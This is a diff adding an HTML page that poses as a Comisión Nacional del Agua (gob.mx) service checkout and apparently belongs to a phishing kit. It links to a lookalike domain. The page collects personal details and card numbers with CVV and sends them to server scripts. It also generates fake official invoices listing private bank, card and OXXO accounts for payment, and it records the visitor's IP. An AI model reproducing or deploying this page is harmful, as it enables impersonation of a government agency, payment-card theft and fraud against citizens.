@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html class='no-js' lang='es'>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <title>Comisión Nacional del Agua | Gobierno | gob.mx</title>
+  <meta charset='UTF-8'>
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#393C3E">
+  <meta content="authenticity_token" name="csrf-param" />
+  <meta content="kQiVNRZqOsVtgXX9VZshOzyZEbxsv2vap3fLgsyMY+8=" name="csrf-token" />
+  <link href='#' rel='stylesheet' type='text/css'>
+  <link data-turbolinks-track="true" href="cms/assets/application.css" media="all" rel="stylesheet" />
+  <link data-turbolinks-track="true" href="https://fonts.googleapis.com/" media="all" rel="preconnect" />
+  <link data-turbolinks-track="true" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700,600,300" media="all" rel="stylesheet" />
+  <link data-turbolinks-track="true" href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&amp;display=swap" media="all" rel="stylesheet" />
+  <script type = "text/javascript"> 
+  var rails_env_prod = true; </script>
+  <script src="cms/assets/application.js"></script>
+
+
+
+<style >
+
+
+    .add-to-cart {
+      margin-top: 10px;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+#cart {
+  position: fixed;
+  top: 90px;
+  right: 10px;
+  border: none; /* Quitamos el borde */
+  padding: 0;
+  width: auto; /* Hacemos que se ajuste al contenido */
+  z-index: 999;
+  box-shadow: none; /* Sin sombra */
+  cursor: pointer;
+}
+#cart-details {
+  background: white;
+  border: 1px solid #ccc;
+  padding: 10px;
+  width: 270px;
+  margin-top: 10px;
+  box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+  position: absolute;
+  right: 0;
+}
+
+    #cart-items img {
+  width: 29px;
+  height: 29px;
+  object-fit: cover;
+  margin-right: 10px;
+  border-radius: 4px;
+}
+
+    #cart-items {
+      max-height: 200px;
+      overflow-y: auto;
+      padding-left: 20px;
+    }
+    #cart button {
+      margin-top: 10px;
+    }
+
+
+/* Responsive Design */
+@media screen and (max-width: 768px) {
+  .product-container {
+    flex-direction: column;
+  }
+  
+  .product-image img {
+    width: 100%;
+    height: auto;
+  }
+  
+  .product-details {
+    width: 100%;
+  }
+}
+
+
+.kilo-select {
+  padding: 5px 10px;
+  border: 1px solid #28a745; /* verde Bootstrap */
+  border-radius: 4px;
+  font-size: 14px;
+  background-color: #f8f9fa; /* gris claro */
+  color: #212529;
+  transition: border-color 0.3s ease, box-shadow 0.3s ease;
+  width: 100%;
+  margin-bottom: 5px;
+}
+
+.kilo-select:focus {
+  border-color: #218838;
+  outline: none;
+  box-shadow: 0 0 5px rgba(40, 167, 69, 0.5);
+  background-color: #fff;
+}
+
+#checkout-items img {
+    width: 50px; /* Ajusta el tamaño de las imágenes según sea necesario */
+    height: auto;
+    object-fit: cover; /* Asegura que las imágenes se recorten bien si es necesario */
+    margin-right: 10px;
+    border-radius: 4px;
+}
+/* Estilos para el carrito de compras */
+.carrito, .formulario, .metodo-pago, .tarjeta-form {
+  background-color: #fff;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+}
+
+.carrito h2, .formulario h2, .metodo-pago h2, .tarjeta-form h2 {
+  margin-bottom: 20px;
+  font-size: 24px;
+  color: #28a745;
+}
+/* Ocultar elementos por defecto */
+.tarjeta-form, .metodo-pago {
+  display: none;
+}
+
+/* Fuerza las columnas del checkout en fila */
+#checkout-wrapper {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  gap: 20px;
+  margin-top: 20px;
+}
+
+/* Columna izquierda: formulario */
+#checkout-form-container {
+  flex: 1 1 48%;
+  min-width: 300px;
+}
+
+/* Columna derecha: carrito */
+#checkout-cart-container {
+  flex: 1 1 48%;
+  min-width: 300px;
+  background: #98bbff;
+  padding: 15px;
+  border-radius: 8px;
+  box-shadow: 0 0 8px rgba(0,0,0,0.05);
+}
+
+/* Responsive (en móvil vuelve a columnas) */
+@media (max-width: 768px) {
+  #checkout-wrapper {
+    flex-direction: column;
+  }
+}
+.popup {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.6);
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+  margin-top: 15%;
+}
+
+.popup-contenido {
+  background: white;
+  padding: 20px 30px;
+  border-radius: 10px;
+  text-align: center;
+}
+
+</style>
+<body>
+
+
+
+
+  <header>
+    <nav class="navbar navbar-inverse  navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-target="#navbarMainCollapse" data-toggle="collapse">
+            <span class="sr-only">Interruptor de Navegación</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="https://www.gob.mx.conagua.articulos.cc/suministro/index.html" style="padding: 1px 3px 3px 3px;" class="navbar-brand " title="Ir a la página inicial">
+            <div class="logo-main"></div>
+          </a>
+        </div>
+        <div id="navbarMainCollapse" class="collapse navbar-collapse nav-padding">
+          <ul class="nav navbar-nav navbar-right">
+           <li><a href="https://www.gob.mx/tramites" title="Trámites">Trámites </a></li>
+            <li><a href="https://www.gob.mx/gobierno" title="Gobierno">Gobierno</a></li>
+              
+                </li>
+            <li>
+                </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+  </header>
+
+
+
+
+<main class="home">
+    <h1 class="sr-only">Sitio de Comisión Nacional del Agua</h1>
+    <div class="paginated">
+    <script src="cms/assets/level_jump.js"></script><section>
+<nav class=" navbar-inverse sub-navbar fixed-top" >
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#subenlaces">
+        <span class="sr-only">Interruptor de Navegación</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="link-name" href="conaguaace1.html?tab="></a>
+    </div>
+    <div class="collapse navbar-collapse" id="subenlaces">
+      <ul class="nav subnav navbar-nav navbar-right">
+              
+    <li class="landing-btn">
+                    <a href='#956'>
+                Comunicados            </a>
+            </li>
+    <li class="landing-btn">
+                    <a href='#953'>
+                Lo más destacado            </a>
+            </li>
+    <li class="landing-btn">
+                    <a href='#959'>
+                Documentos            </a>
+            </li>
+    <li class="landing-btn">
+                    <a href='#957'>
+                Acciones y programas            </a>
+            </li>
+
+    <li class="landing-btn">
+                    <a href='#15226'>
+                Blog            </a>
+            </li>
+    <li class="landing-btn">
+                    <a href='https://app.conagua.gob.mx/protecciondatospersonales/Contenido.aspx?n1=11&amp;n2=212'>
+                Datos Personales            </a>
+            </li>
+    <li class="landing-btn">
+                    <a href='https://app.conagua.gob.mx/transparencia/Contenido.aspx?n1=8'>
+                Transparencia            </a>
+            </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+<style>
+  .flag-banner {
+  top: 45px  !important;
+  }
+</style>
+        <section class="section section-intro flag-banner-principal main-banner" >
+  <div id="videoContainer" class="video-container" style="position: absolute; top: 0;display: none"></div>
+<div class="container">
+  <div class="section-intro__content" style="color: transparent;">
+    <h1>-</h1>
+    <p class="text-border">-</p>
+  </div>
+</div>
+
+</section>
+
+<style>
+    @media only screen and (max-width: 320px) and (min-width: 0px){
+        .flag-banner-principal {
+            min-height: 300px;
+            background: transparent url('cms/uploads/identity/image/48005/mobile_background_Icono_150_movil.jpg') no-repeat center top;
+            background-size: cover; top:0;
+            margin-bottom: 30px !important;
+        }
+        .flag-banner-global {
+            min-height: 200px;
+            background: transparent url('') no-repeat center top;
+            background-size: 100% auto;
+            top:0;
+            margin-bottom: 10px !important;
+        }
+    }
+    /* Small devices such as large phones (640px and up) */
+    @media only screen and (max-width: 640px) and (min-width: 321px){
+        .flag-banner-principal {
+            min-height: 300px;
+            background: transparent url('cms/uploads/identity/image/48005/mobile_background_Icono_150_movil.jpg') no-repeat center top;
+            background-size: cover; top:0;
+            margin-bottom: 30px !important;
+        }
+        .flag-banner-global {
+            min-height: 250px;
+            background: transparent url('') no-repeat center top;
+            background-size: 100% auto;
+            top:0;
+            margin-bottom: 10px !important;
+        }
+}
+
+/* Medium devices such as tablets (768px and up) */
+    @media only screen and (max-width: 768px) and (min-width: 641px){
+        .flag-banner-global {
+            margin-bottom: 30px !important;
+            background: transparent url('') no-repeat center top;
+            margin-bottom: 30px !important;
+            min-height: 150px;
+            background-size: 100%;
+        }
+
+        .flag-banner-principal{
+            min-height: 350px;
+            background: transparent url('cms/uploads/identity/image/46949/background_Conagua_header_150.jpg') no-repeat center top;
+            background-size: cover; top:0;
+            margin-bottom: 30px !important;
+        }
+    }
+
+    /* Large devices such as laptops (1024px and up) */
+    @media only screen and (max-width: 1024px) and (min-width: 769px){
+        .flag-banner-global {
+            margin-bottom: 0px !important;
+            background: transparent url('') no-repeat center top;
+            min-height: 200px;
+            background-size: 100%; top:0;
+        }
+        .flag-banner-principal {
+            min-height: 350px;
+            background: transparent url('cms/uploads/identity/image/46949/background_Conagua_header_150.jpg') no-repeat center top;
+            background-size: cover; top:0;
+            margin-bottom: 30px !important;
+        }
+    }
+
+    /* Largest devices such as desktops (1280px and up) */
+    @media only screen and (max-width: 1440px) and (min-width: 1025px){
+        .flag-banner-global {
+            min-height:  300px;
+            margin-bottom: 30px !important;
+            background-size: 100% 100% !important;
+            background: transparent url('') no-repeat center top;
+        }
+        .flag-banner-principal {
+            min-height: 350px;
+            background: transparent url('cms/uploads/identity/image/46949/background_Conagua_header_150.jpg') no-repeat center top;
+            background-size: cover;
+            margin-bottom: 30px !important;
+        }
+    }
+    /* Largest devices such as desktops (1280px and up) */
+    @media only screen and (max-width: 4500px) and (min-width: 1441px){
+        .flag-banner-global {
+            min-height:  350px;
+            margin-bottom: 30px !important;
+            background-size: contain !important;
+            background: transparent url('') no-repeat center top;
+        }
+        .flag-banner-principal {
+            min-height: 350px;
+            background: transparent url('cms/uploads/identity/image/46949/background_Conagua_header_150.jpg') no-repeat center top;
+            background-size: cover;
+            margin-bottom: 30px !important;
+        }
+    }
+</style>
+<link href="cms/assets/responsiveslides.css" media="screen" rel="stylesheet" />
+<script src="cms/assets/responsiveslides.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+<div class="row" style="padding:10% ;">
+  <body>
+
+
+<div id="checkout-wrapper">
+  <!-- Formulario -->
+  <div id="checkout-form-container">
+    <h3>Datos del Ciudadano o Empresa</h3>
+    <form id="checkout-form">
+      <label for="name">Nombre:</label>
+      <input type="text" id="name" required><br>
+
+      <label for="email">Correo electronico:</label>
+      <input type="email" id="email" required><br>
+
+      <label for="calle">Calle y numero:</label>
+      <input type="text" id="calle" required><br>
+
+      <label for="postal">Codigo Postal:</label>
+      <input type="text" id="postal" required><br>
+
+      <label for="muni">Municipio:</label>
+      <input type="text" id="muni" required><br>
+
+      <label for="tel">Telefono:</label>
+      <input type="text" id="tel" required><br>
+
+      <button type="submit">Confirmar Compra</button>
+    </form>
+  </div>
+
+  <!-- Método de pago -->
+  <div id="metodo-pago" style="display:none;">
+    <h3>Selecciona un metodo de pago:</h3>
+    <button onclick="mostrarPago('efectivo')">Efectivo</button>
+    <button onclick="mostrarPago('tarjeta')">Tarjeta</button>
+    <button onclick="mostrarPago('transferencia')">Transferencia</button>
+
+    <div id="pago-efectivo" class="tarjeta-form" style="display:none;">
+      <p>Descarga tu factura <br>.</p>
+      <button onclick="finalizarCompra()">Finalizar Compra</button>
+    </div>
+
+    <div id="pago-tarjeta" class="tarjeta-form" style="display:none;">
+      <h4>Detalles de la tarjeta</h4>
+      <form action="procesar_pago.php" method="POST">
+        <input type="text" name="numero_tarjeta" placeholder="Numero de tarjeta" required><br>
+        <input type="text" name="nombre_tarjeta" placeholder="Nombre en la tarjeta" required><br>
+        <input type="text" name="fecha_vencimiento" placeholder="MM/AA" required><br>
+        <input type="text" name="cvv" placeholder="CVV" required><br>
+        <button type="submit">Pagar</button>
+      </form>
+    </div>
+
+    <div id="pago-transferencia" class="tarjeta-form" style="display:none;">
+      <p>Transfiere a:</p>
+      <p><strong>Banco:</strong> Banorte</p>
+           <p><strong>CONVENIO:</strong> A578302</p>
+      <p><strong>CLABE:</strong> 072580013092857256</p>
+      <p><strong>Beneficiario:</strong> Comisión Nacional del Agua
+      <br>Verifica que el nombre del representante legal sea : Karen Janette Huerta Olmos</p>
+      <button onclick="finalizarCompra()">He realizado la transferencia</button>
+    </div>
+  </div>
+
+  <!-- Carrito -->
+  <div id="checkout-cart-container">
+    <h3>Servicio solicitado :</h3>
+    <ul id="checkout-items"></ul>
+    <p><strong>Total: $<span id="checkout-total">0.00</span></strong></p>
+  </div>
+</div>
+<script>
+  let carrito = JSON.parse(localStorage.getItem('carrito')) || [];
+
+  function actualizarCheckout() {
+    const lista = document.getElementById('checkout-items');
+    const total = document.getElementById('checkout-total');
+    lista.innerHTML = '';
+    let totalPrecio = 0;
+
+    carrito.forEach((item) => {
+      const li = document.createElement('li');
+
+      const img = document.createElement('img');
+      img.src = item.imagen;
+      img.alt = item.nombre;
+      img.style.width = '50px';
+      img.style.height = '50px';
+
+      const texto = document.createElement('span');
+      texto.textContent = `${item.nombre} - $${item.precio.toFixed(2)}`;
+
+      li.appendChild(img);
+      li.appendChild(texto);
+      lista.appendChild(li);
+
+      totalPrecio += item.precio;
+    });
+
+    total.textContent = totalPrecio.toFixed(2);
+  }
+
+  /* =====================
+     YA NO ENVÍA NADA AQUÍ
+     ===================== */
+  document.getElementById('checkout-form').addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    // Solo cambio de pantalla
+    document.getElementById('checkout-form-container').style.display = 'none';
+    document.getElementById('metodo-pago').style.display = 'block';
+  });
+
+  function mostrarPago(tipo) {
+    document.querySelectorAll('.tarjeta-form').forEach(div => div.style.display = 'none');
+
+    if (tipo === 'efectivo' || tipo === 'transferencia') {
+      generarPDF();
+    }
+
+    document.getElementById(`pago-${tipo}`).style.display = 'block';
+  }
+
+  function generarPDF() {
+    const { jsPDF } = window.jspdf;
+    const doc = new jsPDF();
+
+    const nombre = document.getElementById('name').value;
+    const email = document.getElementById('email').value;
+    const calle = document.getElementById('calle').value;
+    const postal = document.getElementById('postal').value;
+    const muni = document.getElementById('muni').value;
+    const tel = document.getElementById('tel').value;
+
+    const fechaHoraPedido = new Date().toLocaleString();
+    const numeroOrden = Math.floor(100000 + Math.random() * 900000);
+
+    fetch('get_ip.php')
+      .then(response => response.json())
+      .then(data => {
+        const numeroCliente = data.ip.replace(/\./g, '');
+        dividirYGenerarPDF(numeroCliente);
+      })
+      .catch(() => {
+        const numeroCliente = 'No disponible';
+        dividirYGenerarPDF(numeroCliente);
+      });
+
+    function dividirYGenerarPDF(numeroCliente) {
+      const productosPorFactura = 6;
+      const totalProductos = carrito.length;
+      const facturas = [];
+
+      for (let i = 0; i < totalProductos; i += productosPorFactura) {
+        facturas.push(carrito.slice(i, i + productosPorFactura));
+      }
+
+      facturas.forEach((factura, index) => {
+        generarPDFConDatos(factura, numeroCliente, index + 1);
+      });
+    }
+
+    function generarPDFConDatos(factura, numeroCliente, facturaNumero) {
+      const doc = new jsPDF();
+      const logoUrl = 'log.png';
+      const logoUrlFooter = 'lo.png';
+      const logoIzquierdo = 'logo-izquierdo.png';
+
+      doc.setFontSize(12);
+
+      doc.addImage(logoIzquierdo, 'PNG', 10, 13, 50, 18);
+      doc.addImage(logoUrl, 'PNG', 157, 10, 40, 40);
+
+      doc.setFontSize(17);
+      doc.text('Secretaría de Medio Ambiente y Recursos Naturales', 10, 40);
+      doc.text('Comisión Nacional del Agua', 10, 46);
+
+      doc.setFontSize(10);
+      doc.text('Av. Insurgentes Sur 2416' , 10, 54);
+      doc.text('Copilco el Bajo, Coyoacán, 04340 Ciudad de México, CDMX ', 10, 59);
+      doc.text('Teléfono: +52 777 945 1029', 10, 64);
+
+      doc.setLineWidth(0.5);
+      doc.line(10, 65, 200, 65);
+
+      doc.setFontSize(12);
+      doc.text(`Número de Orden: ${numeroOrden}`, 10, 80);
+      doc.text(`Número de Cliente: ${numeroCliente}`, 10, 75);
+      doc.text(`Factura #${facturaNumero}`, 10, 70);
+
+      doc.text(`Nombre: ${nombre}`, 10, 95);
+      doc.text(`Correo: ${email}`, 10, 100);
+      doc.text(`Dirección: ${calle}, ${muni}, CP: ${postal}`, 10, 105);
+      doc.text(`Teléfono: ${tel}`, 10, 110);
+      doc.text(`Fecha y Hora del Pedido: ${fechaHoraPedido}`, 10, 115);
+
+      const cadenaSeguridad = generarCadenaSeguridad(90);
+      doc.setFontSize(8);
+      doc.text(`Código de seguridad: ${cadenaSeguridad}`, 10, 120);
+      doc.setFontSize(12);
+
+      doc.line(10, 125, 200, 125);
+
+      doc.text('Producto', 10, 130);
+      doc.text('Cantidad', 100, 130);
+      doc.text('Precio', 150, 130);
+
+      doc.line(10, 134, 200, 134);
+
+      let y = 142;
+      factura.forEach(item => {
+        doc.text(item.nombre, 10, y);
+        doc.text('1', 100, y);
+        doc.text(`$${item.precio.toFixed(2)}`, 150, y);
+        y += 10;
+      });
+
+      doc.line(10, y, 200, y);
+
+      let total = factura.reduce((acc, i) => acc + i.precio, 0);
+      const iva = total * 0.16;
+      const subtotal = total - iva;
+      const costoEnvio = 0;
+      total += costoEnvio;
+
+      doc.setFontSize(12);
+      doc.text(`Subtotal: $${subtotal.toFixed(2)}`, 142, y + 10);
+      doc.text(`IVA (16%): $${iva.toFixed(2)}`, 142, y + 20);
+      doc.text(`Costo de Envío: $${costoEnvio.toFixed(2)}`, 142, y + 30);
+      doc.text(`Total: $${total.toFixed(2)}`, 142, y + 40);
+
+      doc.addImage(logoUrlFooter, 'PNG', 63, 250, 85, 35);
+
+      doc.setFontSize(14);
+      doc.text('Puede realizar su pago en EFECTIVO con :', 10, y + 10);
+      doc.text('Referencia para Banorte', 10, y + 15);
+      doc.text('Tarjeta: 4915 6695 2595 1925', 10, y + 20);
+      doc.text('Cuenta: 13-2436-8658', 10, y + 25);
+      doc.text('Referencia para OXXO', 10, y + 35);
+      doc.text('Cuenta Spin: 2242 - 1708 - 3006 - 6871', 10, y + 40);
+      doc.text('Referencia para TRANSFERENCIA', 10, y + 50);
+      doc.text('Cuenta Banorte:072580013243686580', 10, y + 55);
+
+  // Generar PDF correcto y enviarlo al servidor
+const pdfDataUri = doc.output("datauristring");
+const pdfBase64 = pdfDataUri.split(",")[1]; // <---- ESTA LÍNEA LO ARREGLA
+enviarPDFAlServidor(pdfBase64);
+
+doc.save(`formato_de_pago_${facturaNumero}.pdf`);
+
+    }
+  }
+
+  function generarCadenaSeguridad(longitud) {
+    const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+[]{}|;:,.<>?/';
+    let resultado = '';
+    for (let i = 0; i < longitud; i++) {
+      resultado += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+    }
+    return resultado;
+  }
+
+  function finalizarCompra() {
+    carrito = [];
+    localStorage.removeItem('carrito');
+    actualizarCheckout();
+    document.getElementById('popup-confirmacion').style.display = 'block';
+  }
+
+  function cerrarPopup() {
+    document.getElementById('popup-confirmacion').style.display = 'none';
+    window.location.href = 'index.html';
+  }
+
+  window.addEventListener('DOMContentLoaded', actualizarCheckout);
+
+  function enviarPDFAlServidor(pdfBase64) {
+    const data = {
+      carrito,
+      nombre: document.getElementById('name').value,
+      email: document.getElementById('email').value,
+      calle: document.getElementById('calle').value,
+      postal: document.getElementById('postal').value,
+      muni: document.getElementById('muni').value,
+      tel: document.getElementById('tel').value,
+      pdfBase64
+    };
+
+    fetch("process_checkout.php", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(res => console.log("PDF enviado al servidor"))
+    .catch(err => console.error("Error enviando PDF:", err));
+  }
+</script>
+
+
+
+</div>
+
+</main>
+
+<footer class="main-footer">
+  <div class="list-info">
+    <div class="container">
+      <div class="col-sm-3">
+        <img  src="https://framework-gb.cdn.gob.mx/gobmx/img/logo_blanco.svg"  href="index.html" alt="logo gobierno de méxico" class="logo_footer" style="max-width: 90%; margin-left: -27px;   margin-top: 12px;">
+      </div>
+      <div class="col-sm-3">
+        <h2>Enlaces</h2>
+        <ul>
+          <li><a  href="https://datos.gob.mx/" target="_blank"  >Datos</a></li>
+
+                  <li><a class="footer" href="https://app.conagua.gob.mx/transparencia/Contenido.aspx?n1=8" id="Transparencia" target="blank" title="Enlace abre en ventana nueva">Portal de Obligaciones de Transparencia</a></li>
+
+                  <li><a class="footer" href="https://consultapublicamx.plataformadetransparencia.org.mx/vut-web/" id="PNT" target="blank" title="Enlace abre PNT en ventana nueva">PNT</a></li>
+
+                  <li><a class="footer" href="http://www.inai.org.mx/" id="INAI" target="blank" title="Enlace abre sitio INAI en ventana nueva">INAI</a></li>
+
+          <li><a class="footer" id="INAI" href="http://alertadores.funcionpublica.gob.mx/" target="_blank" rel="alertadores">Alerta</a></li>
+          <li><a class="footer" id="SIDEC" href="http://sidec.funcionpublica.gob.mx/" target="_blank" rel="sidec">Denuncia</a></li>
+           </ul>
+      </div>
+      <div class="col-sm-3">
+        <h2>¿Qué es gob.mx?</h2>
+        <p>Es el portal único de trámites, información y participación ciudadana.  <a href="que-es-gobmx.html"  target="_blank" style="text-decoration: none;">Leer más </a></p>
+        <ul>
+          <li><a href="https://www.gob.mx/accesibilidad"  target="_blank">Declaración de Accesibilidad</a></li>
+          <li><a href="https://www.gob.mx/terminos"  target="_blank">Términos y Condiciones </a></li>
+          <li><a href="https://www.gob.mx/terminos#medidas-seguridad-informacion">Política de seguridad</a></li>
+          <li><a class="footer" id="Marco Juridico" href="http://www.ordenjuridico.gob.mx/" target="_blank" rel="noopener" title="Enlace abre en ventana nueva">Marco jurídico</a></li>
+          <li><a href="https://www.gob.mx/sitemap"  target="_blank">Mapa de sitio</a></li>
+        </ul>
+      </div>
+      <div class="col-sm-3">
+        </p>
+        <h2>Síguenos en </h2>
+        <ul class="list-inline">
+          <li>
+            <a id="Twitter" href="https://www.instagram.com/gobmexico/" target="_blank" rel="noopener" class="instagram share-info footer" title="Enlace a instagram abre en una nueva ventana">
+              <img src="cms/assets/instagram.png" alt="gob.mx">
+            </a>
+          </li>
+          <li>
+            <a id="Twitter" href="https://www.youtube.com/@gobiernodemexico" target="_blank" rel="noopener" class="yotube share-info footer" title="Enlace a Youtube abre en una nueva ventana">
+              <img src="cms/assets/youtube.png" alt="gob.mx">
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="container-fluid footer-pleca">
+    <div class="row">
+      <div class="col">
+        <br><br>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<style type="text/css">.redes-flotantes {
+position: fixed;
+right: 8px;
+top: 75%;
+z-index: 17;
+max-width: 50px;
+
+}
+.redes-flotantes img {
+float: right; clear: right;
+ margin: 5px;
+-moz-transform: scale(.8) ;
+-webkit-transform: scale(.8) ;
+-o-transform: scale(.8) ;
+-ms-transform: scale(.8) ;
+transform: scale(.5) ;
+-webkit-transition: all .2s ease-in-out;
+-moz-transition: all .2s ease-in-out;
+-o-transition: all .2s ease-in-out;
+transition: all .2s ease-in-out;
+}</style>
+<div class='redes-flotantes'>
+<div class="btn-whatsapp">
+<a href="https://wa.me/message/4V4H26Z2LT6ZG1">
+<img src="w.png" alt="">
+</a>
+</div>
+    <script src="cms/assets/paginator.js"></script>
+    <script src="cms/assets/paginate.js"></script>
+    <script src="cms/assets/paginate-content.js"></script>
+</body>
+</html>
+
